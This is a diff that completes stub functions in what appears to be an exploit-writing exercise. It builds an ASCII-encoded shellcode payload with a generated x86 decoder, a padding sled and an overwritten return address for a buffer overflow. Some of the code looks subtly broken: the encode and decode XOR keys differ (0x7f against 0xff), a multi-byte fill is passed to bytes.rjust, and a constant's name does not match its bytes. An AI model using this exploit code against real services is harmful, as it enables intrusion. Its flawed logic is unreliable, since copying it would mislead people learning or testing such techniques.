@@ -15,6 +15,11 @@ LOCAL_PORT = 1337
 
 ASCII_MAX = 0x7f
 
+DECODER_FILE_PATH = "decoder.asm"
+
+NEW_LINE = "\n"
+
+INC_EBX_AS_NOP = "\x66\x31\xf6"
 
 def warn_invalid_ascii(selector=None):
     selector = selector or (lambda x: x)
@@ -53,9 +58,18 @@ def encode(data: bytes) -> Tuple[bytes, Iterable[int]]:
     Returns:
         A tuple of [the encoded data, the indices that need decoding]
     """
-    # TODO: IMPLEMENT THIS FUNCTION
-    raise NotImplementedError()
+    data_bytes_lst = list(data)
+    patched_indexes = []
 
+    for idx, byte in enumerate(data_bytes_lst):
+        if byte <= ASCII_MAX:
+            continue
+        data_bytes_lst[idx] ^= ASCII_MAX
+        patched_indexes.append(idx)
+    
+    patched_data = bytes(data_bytes_lst)
+    return patched_data, patched_indexes
+        
 
 @warn_invalid_ascii()
 def get_decoder_code(indices: Iterable[int]) -> bytes:
@@ -73,8 +87,17 @@ def get_decoder_code(indices: Iterable[int]) -> bytes:
     Returns:
          The decoder coder (assembled, as bytes)
     """
-    # TODO: IMPLEMENT THIS FUNCTION
-    raise NotImplementedError()
+    decoder_code = ""
+    for idx in indices:
+        # ascii bytes code that effectivly does:
+        # mov bl, 0xff 
+        decoder_code += "push 0x100" + NEW_LINE
+        decoder_code += "pop ebx" + NEW_LINE
+        decoder_code += "dec ebx" + NEW_LINE
+        decoder_code += f"xor byte ptr [eax + {idx}], bl" + NEW_LINE
+    with open(DECODER_FILE_PATH, "w") as writer:
+        writer.write(decoder_code)
+    return assemble.assemble_file(DECODER_FILE_PATH)
 
 
 @warn_invalid_ascii()
@@ -122,9 +145,11 @@ def get_payload() -> bytes:
     Returns:
          The bytes of the payload.
     """
-    # TODO: IMPLEMENT THIS FUNCTION
-    raise NotImplementedError()
-
+    encoded_shellcode = get_encoded_shellcode()
+    # xor si, si
+    ret_addr = struct.pack("<I", 0x12345678)
+    payload = encoded_shellcode.rjust(1040, INC_EBX_AS_NOP) + ret_addr + "\0".encode('latin1')
+    return payload
 
 def main():
     # WARNING: DON'T EDIT THIS FUNCTION!
